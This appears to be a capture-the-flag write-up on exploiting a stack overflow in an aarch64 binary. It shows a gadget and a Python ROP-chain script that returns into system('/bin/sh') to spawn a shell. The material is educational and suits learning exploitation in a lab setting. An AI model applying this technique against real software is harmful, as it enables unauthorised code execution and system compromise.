# aarch64

## Solution

The first thing to notice about the binary was that it was compiled using aarch64, instead of x86_64. Upon running the binary, we first note that we can see `/bin/sh` printed out, leading one to believe that that will likely be useful. Next, we are asked for user input, and if we provide a large input, the program suffers from a segmentation fault. This leads one to believe that a ROP chain will need to be used.

When looking into the binary, we see that it makes a call to system, leading one to believe that a return to system expoit will be effective against this binary. Thus, one only needs to find a way to populate the `x0` register. One can find the following gadget:
```
00400854  e007c1a8   ldp     x0, x1, [sp], #0x10 {arg1} {arg2}
00400858  fd7bc1a8   ldp     x29, x30, [sp], #0x10 {arg3} {arg_18}
0040085c  c0035fd6   ret     
```
Thus, it seems that, using this gadget, one could populate `x0` with the address of `/bin/sh` and then use the ROP-chain to call system. The following Python code accomplishes this:
```python
gadget = 0x400854
bin_sh = 0x401001
system = 0x400680

p = start()

chain = b"A"*40
chain += p64(gadget)
chain += p64(bin_sh)
chain += p64(0xdeadbeef)
chain += p64(0xdeadbeef)
chain += p64(system)

p.sendline(chain)

p.interactive()
```